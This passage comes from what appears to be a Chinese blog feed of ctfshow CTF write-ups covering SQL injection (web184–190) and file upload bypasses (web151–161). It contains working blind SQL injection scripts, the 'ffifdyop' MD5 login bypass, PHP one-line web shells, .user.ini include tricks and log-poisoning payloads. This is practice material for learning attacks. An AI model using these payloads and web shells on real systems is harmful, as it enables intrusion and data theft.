后的部分</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(hex_list)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">40</span>):</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> flagstr:</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&quot;tableName&quot;</span>: <span class="string">&quot;ctfshow_user group by pass having pass regexp(0x63746673686f77&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(str2hex(flag + x))</span><br><span class="line">            &#125;</span><br><span class="line">            response = requests.post(url, data=data)</span><br><span class="line">            time.sleep(<span class="number">0.3</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> response.text.find(<span class="string">&quot;user_count = 1;&quot;</span>) &gt; <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125; is right&quot;</span>.<span class="built_in">format</span>(x))</span><br><span class="line">                flag += x</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125; is wrong&quot;</span>.<span class="built_in">format</span>(x))</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#123;af4515fa-97ae-4fd0-b6d2-0151465cef51&#125;</span></span><br></pre></td></tr></table></figure><h2 id="web185"><a class="header-anchor" href="#web185">¶</a>web185</h2><ul><li>描述: 同上</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#x27;|\&quot;|union|\`|sleep|benchmark/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment"># 查询和返回不变, 还是爆破</span></span><br></pre></td></tr></table></figure><p>主要新增过滤是0-9, 但是在mysql中是可以构造数字和字符串的, 可以查询看看有哪些函数可以对字符串进行操作: <a href="https://dev.mysql.com/doc/refman/8.4/en/string-functions.html">官方网站str相关函数</a></p><p>尝试拼接, 命令如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select true+true;# 返回2</span><br><span class="line">select concat((true+true),(true+true));# 返回22</span><br><span class="line">select concat((true+true),(true+true),&#x27;f&#x27;);# 返回22f</span><br><span class="line">select false;# 返回0</span><br><span class="line">select concat(false);# 返回0</span><br></pre></td></tr></table></figure><p>我看不太懂, 我找了个能用的, 反正就是将字符串中的数字变为上面那种拼接, 更甚者可以直接把所有字符变为十六进制然后用上面的方法表示</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://e5df6fcd-a811-4d47-a7d4-4e57d70037df.challenge.ctf.show/select-waf.php&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;ctfshow_user group by pass having pass like(concat(&#123;&#125;))&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createNum</span>(<span class="params">n</span>):</span><br><span class="line">    num = <span class="string">&#x27;true&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;true&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>):</span><br><span class="line">            num += <span class="string">&quot;+true&quot;</span></span><br><span class="line">        <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createStrNum</span>(<span class="params">c</span>):</span><br><span class="line">    <span class="built_in">str</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">str</span> += <span class="string">&#x27;chr(&#x27;</span> + createNum(<span class="built_in">ord</span>(c[<span class="number">0</span>])) + <span class="string">&#x27;)&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> c[<span class="number">1</span>:]:</span><br><span class="line">        <span class="built_in">str</span> += <span class="string">&#x27;,chr(&#x27;</span> + createNum(<span class="built_in">ord</span>(i)) + <span class="string">&#x27;)&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">uuid = string.ascii_lowercase + string.digits + <span class="string">&quot;-&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> uuid:</span><br><span class="line">        payload1 = payload.<span class="built_in">format</span>(createStrNum(flag + j + <span class="string">&quot;%&quot;</span>))</span><br><span class="line">        <span class="comment"># print(payload1)</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: payload1</span><br><span class="line">        &#125;</span><br><span class="line">        re = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 0;&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> re.text:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web186"><a class="header-anchor" href="#web186">¶</a>web186</h2><ul><li>描述: 过滤的有亿…多</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\%|\&lt;|\&gt;|\^|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#x27;|\&quot;|union|\`|sleep|benchmark/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment"># 其他不变</span></span><br></pre></td></tr></table></figure><p>结果是上一题的py脚本可以继续跑</p><h2 id="web187"><a class="header-anchor" href="#web187">¶</a>web187</h2><ul><li>描述: 无过滤</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line">  <span class="variable">$sql</span> = <span class="string">&quot;select count(*) from ctfshow_user where username = &#x27;<span class="subst">$username</span>&#x27; and password= &#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回逻辑</span></span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>],<span class="literal">true</span>);</span><br><span class="line">    <span class="comment">//只有admin可以获得flag</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$username</span>!=<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名不存在&#x27;</span>;</span><br><span class="line">        <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>本题是给了实际的用户登录界面:</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240807173808461.png" alt="image-20240807173808461"></p><p>向您推荐:<code>ffifdyop</code>:</p><p>在经过md5加密后, 该字符串会变为<code>'or'6(不可见字符)</code>, 是否可用可以用本地测试:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 不可行</span><br><span class="line">select count(*) from user where username =&#x27;&#x27;or&#x27;aaaa&#x27;;</span><br><span class="line"># 可行</span><br><span class="line">select count(*) from user where username =&#x27;&#x27;or&#x27;6aaaa&#x27;;</span><br></pre></td></tr></table></figure><p>经过测试之后发现只要or后出现数字, 该指令就可执行, 原因是进行了类型转换</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST:</span><br><span class="line">username=admin&amp;password=ffifdyop</span><br></pre></td></tr></table></figure><p>直接输入会显示登录成功, 要抓包查看返回的flag</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240807175433509.png" alt="image-20240807175433509"></p><h2 id="web188"><a class="header-anchor" href="#web188">¶</a>web188</h2><ul><li>描述: 继续注入</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"> <span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = <span class="subst">&#123;$username&#125;</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line"> <span class="comment">//用户名检测</span></span><br><span class="line"> <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/and|or|select|from|where|union|join|sleep|benchmark|,|\(|\)|\&#x27;|\&quot;/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">   <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">   <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">//密码检测</span></span><br><span class="line"> <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">   <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;密码只能为数字&#x27;</span>;</span><br><span class="line">   <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">//密码判断</span></span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>]==<span class="title function_ invoke__">intval</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">     <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">     <span class="title function_ invoke__">array_push</span>(<span class="variable">$ret</span>[<span class="string">&#x27;data&#x27;</span>], <span class="keyword">array</span>(<span class="string">&#x27;flag&#x27;</span>=&gt;<span class="variable">$flag</span>));</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>同样是给了登录框, 同时新增了一堆过滤</p><p>当你把查询语句放进本地数据库测试, 你会发现当传入的<code>$username</code>为0, 他会输出所有username中开头是字母的值, 下图会更清晰:</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240810205728809.png" alt="image-20240810205728809"></p><p>可以看到在没有单引号包裹的情况下, 会进行字符类型转换, 首字符是字母转换就是0, 首字符是数字就会匹配输入的数字</p><p>所以payload(在提交界面抓包):</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST:</span><br><span class="line">username=0&amp;password=0</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240810211529444.png" alt="image-20240810211529444"></p><h2 id="web189"><a class="header-anchor" href="#web189">¶</a>web189</h2><ul><li>描述: flag在api/index.php文件中</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//用户名检测</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/select|and| |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\x26|\x7c|or|into|from|where|join|sleep|benchmark/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">  <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">  <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//密码检测</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">  <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;密码只能为数字&#x27;</span>;</span><br><span class="line">  <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//密码判断</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>用户名传入0和1会有不同的输出, 这样就够我们进行布尔盲注了:</p><blockquote><p>传入1是查询失败, 传入0是密码错误; 验证下面是否错误可以传入<code>username=if(2&gt;1,1,0)</code>自行判断</p></blockquote><p>利用<code>if(condition, value_if_true, value_if_false)</code>, 结合<code>load_file()</code>对文件内容内容进行判断, 即当存在时返回0, 不存在时返回1</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://c9ec4901-3538-48f2-9ce5-4aa9fc7b17d1.challenge.ctf.show/api/index.php&quot;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;&#123;&#125;-0123456789abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">flag = <span class="string">&quot;ctfshow&#123;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        result = flag + j</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">&quot;if(load_file(&#x27;/var/www/html/api/index.php&#x27;)regexp(&#x27;&#123;&#125;&#x27;),0,1)&quot;</span>.<span class="built_in">format</span>(result),</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">r&quot;\u5bc6\u7801\u9519\u8bef&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="comment"># ctfshow&#123;7f8b065e-9817-4ae2-a14d-e39615b7ecae&#125;</span></span><br></pre></td></tr></table></figure><h2 id="web190"><a class="header-anchor" href="#web190">¶</a>web190</h2><ul><li>描述: 不饿</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//密码检测</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">  <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;密码只能为数字&#x27;</span>;</span><br><span class="line">  <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//密码判断</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//<span class="doctag">TODO:</span>感觉少了个啥，奇怪</span></span><br></pre></td></tr></table></figure><p>这次知道加上单引号了</p><p>先测试了用户名, 发现输入不存在的用户名会输出用户不存在; 然后测试注入, 用户名可以注入, 有盲注条件:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27; and 1=1# 密码错误</span><br><span class="line">admin&#x27; and 1=2# 用户名不存在</span><br></pre></td></tr></table></figure><p>剩下就是构造语句查表, 密码错误就是存在, 脚本如下:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> post</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> digits, ascii_lowercase</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://591b6da2-b965-4ff3-a8f4-826f177ed92d.challenge.ctf.show/api/&#x27;</span></span><br><span class="line"><span class="comment"># 数据库值: ctfshow_web</span></span><br><span class="line"><span class="comment"># payload = &#x27;admin\&#x27; and (select database()) regexp \&#x27;&#123;&#125;\&#x27; #&#x27;</span></span><br><span class="line"><span class="comment"># 表名: ctfshow_fl0g</span></span><br><span class="line"><span class="comment"># payload = &#x27;admin\&#x27; and (select group_concat(table_name) from information_schema.tables where table_schema = database()) regexp \&#x27;&#123;&#125;\&#x27; #&#x27;</span></span><br><span class="line"><span class="comment"># 字段: id,f10g</span></span><br><span class="line"><span class="comment"># payload = &#x27;admin\&#x27; and (select group_concat(column_name) from information_schema.columns where table_schema = database() and table_name = \&#x27;ctfshow_fl0g\&#x27;) regexp \&#x27;&#123;&#125;\&#x27; #&#x27;</span></span><br><span class="line"><span class="comment"># 拿到flag: ctfshow&#123;f8302835-ac04-49e8-ba2c-4ee474890ac4&#125;</span></span><br><span class="line">payload = <span class="string">&#x27;admin\&#x27; and (select f1ag from ctfshow_fl0g) regexp \&#x27;&#123;&#125;\&#x27; #&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"><span class="comment"># flag需要修改, 不能留空</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&#x27;-&#125;_&#x27;</span> + digits + ascii_lowercase:</span><br><span class="line">            resp = post(url, &#123;<span class="string">&#x27;username&#x27;</span>: payload.<span class="built_in">format</span>(flag + c), <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;123&#x27;</span>&#125;)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;密码错误&#x27;</span> <span class="keyword">in</span> resp.json().get(<span class="string">&#x27;msg&#x27;</span>):</span><br><span class="line">                flag += c</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">                <span class="keyword">if</span> c == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                    exit()</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctfshow靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
            <tag> 绕过 </tag>
            
            <tag> RCE </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> SQL盲注 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web入门_文件上传</title>
      <link href="/article/ctfshow-webbasic-fileupload/"/>
      <url>/article/ctfshow-webbasic-fileupload/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>文件上传</h1><hr><h2 id="web151"><a class="header-anchor" href="#web151">¶</a>web151</h2><ul><li>描述: 新的起点，加油！</li></ul><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240802105705403.png" alt="image-20240802105705403"></p><p>查看源码发现要求文件后缀只能是png, 但是是前端验证, 上传包含木马的png然后抓包修改后缀为php即可</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240802110307408.png" alt="image-20240802110307408"></p><p>蚁剑或者hackbar执行命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">URL: </span><br><span class="line">/upload/shell.php</span><br><span class="line">payload: </span><br><span class="line">system(&quot;tac ../flag.php&quot;);</span><br></pre></td></tr></table></figure><h2 id="web152"><a class="header-anchor" href="#web152">¶</a>web152</h2><ul><li>描述: 后端不能单一校验</li></ul><p>还是限定png, 尝试上传, 发现如果仅更改文件后缀名为php依然可以上传成功, 可能是上一题本来是修改前端代码改为允许php</p><p>测试后得知验证的是<code>Content-Type</code>, 修改为<code>image/png</code>即可绕过后端验证(是叫做校验MIME吧)</p><p>payload同上一题</p><blockquote><p>直接修改请求包的<code>Host</code>就可以了, 不需要开环境重新劫持</p></blockquote><h2 id="web153"><a class="header-anchor" href="#web153">¶</a>web153</h2><ul><li>描述: 同上</li></ul><p>这次验证的是文件名, 可以用大小写绕过, 但是不能解析, 只能将文件下载下来, 换一种方法(php3之类的也不行)</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240802112532008.png" alt="image-20240802112532008"></p><p>但是没有内容校验, 可能可以利用<code>.user,ini</code>, 详情见<a href="https://www.php.net/manual/zh/configuration.file.per-user.php">官方文档</a>; 似乎说在当前目录下有php文件才会启用用户INI文件, 而在<code>/upload/</code>下刚好有一个<code>index.php</code></p><p>现在查看配置项看看哪些可以利用, 结合题目, 应该是要文件包含</p><ul><li>auto_append_file</li><li>auto_prepend_file</li></ul><blockquote><p>这两个函数作用是指定一个文件, 这个文件会被包含在被执行的php文件中</p><p>区别在于<code>auto_prepend_file</code>是在文件前插入；<code>auto_append_file</code>在文件最后插入（文件末尾有<code>exit()</code>时该设置无效)</p></blockquote><p><code>.user.ini</code>内容如下</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">auto_prepend_file</span>=shell.jpg</span><br></pre></td></tr></table></figure><p>修改前端代码:</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">class</span>=<span class="string">&quot;layui-btn&quot;</span> <span class="attr">id</span>=<span class="string">&quot;upload&quot;</span> <span class="attr">lay-data</span>=<span class="string">&quot;&#123;url: &#x27;upload.php&#x27;, accept: &#x27;file&#x27;&#125;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上传, 修改<code>Content-Type</code>为<code>image/png</code></p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240802123201768.png" alt="image-20240802123201768"></p><p>然后上传要包含的文件, 访问<code>/upload/</code>尝试执行命令, 成功</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240802123741560.png" alt="image-20240802123741560"></p><h2 id="web154"><a class="header-anchor" href="#web154">¶</a>web154</h2><ul><li>描述: 后端不能单二校验</li></ul><p>文件内容和后缀校验, 不能有php</p><p>还是上传<code>.user.ini</code>, 然后上传短标签一句话木马</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240802132959314.png" alt="image-20240802132959314"></p><p>访问<code>/upload/</code>执行命令即可</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;tac ../flag.php&quot;</span>);</span><br></pre></td></tr></table></figure><blockquote><p>可以用蚁剑连接查看upload.php</p><p>如果查看不了可以执行<code>system(&quot;cp ../upload.php ../2.txt&quot;);</code>, 访问即可</p></blockquote><h2 id="web155"><a class="header-anchor" href="#web155">¶</a>web155</h2><ul><li>描述: 后端不能单三校验</li></ul><p>web154的步骤可以直接用</p><h2 id="web156"><a class="header-anchor" href="#web156">¶</a>web156</h2><ul><li>描述: 后端不能单四校验</li></ul><p>在web154的基础上过滤了文件内容中的中括号, 用大括号绕过即可</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240802141715095.png" alt="image-20240802141715095"></p><h2 id="web157"><a class="header-anchor" href="#web157">¶</a>web157</h2><ul><li>描述: 后端不能单五校验</li></ul><p>在web156的基础上过滤了分号, 现在有两种方法:</p><p><strong>直接写入命令, 在被包含的时候执行</strong>或者<strong>改变一句话木马的构造</strong></p><blockquote><p>可以利用本地php环境验证一句话木马可行性</p></blockquote><p>新的一句话木马如下, 利用web154方法先传入<code>.user.ini</code>然后包含该文件即可</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="title function_ invoke__">array_pop</span>(<span class="variable">$_POST</span>))<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240802142838578.png" alt="image-20240802142838578"></p><p>直接执行命令payload如下, 问就是flag一直在根目录</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="title function_ invoke__">system</span>(<span class="string">&quot;tac /var/www/html/flag.???&quot;</span>)<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?=</span><span class="title function_ invoke__">system</span>(<span class="string">&quot;tac ../flag.???&quot;</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="web158"><a class="header-anchor" href="#web158">¶</a>web158</h2><ul><li>描述: 后端不能单六校验</li></ul><p>同样用web157的换一句话木马的方法即可拿到flag</p><p>查看<code>upload.php</code>发现禁止了log, 看来上一题还可以用日志包含进行getshell</p><h2 id="web159"><a class="header-anchor" href="#web159">¶</a>web159</h2><ul><li>描述: 师傅们可以的</li></ul><p>在web158基础上, 括号也没了; 如果没有能执行的函数, 那就尝试包含可写的文件, 只有日志包含了; 或者可以用反引号执行命令:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>`tac ../flag.???`<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>包含日志可以构造如下命令</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">include</span> <span class="string">&#x27;/var/l&#x27;</span>.<span class="string">&#x27;og/nginx/access.l&#x27;</span>.<span class="string">&#x27;og&#x27;</span><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240802165200134.png" alt="image-20240802165200134"></p><p>访问首页然后在User-Agent中写马, 再访问<code>/upload/</code>执行命令</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240802165540742.png" alt="image-20240802165540742"></p><h2 id="web160"><a class="header-anchor" href="#web160">¶</a>web160</h2><ul><li>描述: 同上</li></ul><p>反引号, 空格没了</p><p>但是日志包含还能继续用, 可以用换行符代替空格, 或者直接删除空格即可</p><h2 id="web161"><a class="header-anchor" href="#web161">¶</a>web161</h2><ul><li>描述: 狮虎们轻点，嘤嘤嘤</li></ul><p>现在<code>.user.ini</code>都传不上去了, 但是加上GIF头即可上传(问就是PNG头太麻烦了)</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240802180342439.png" 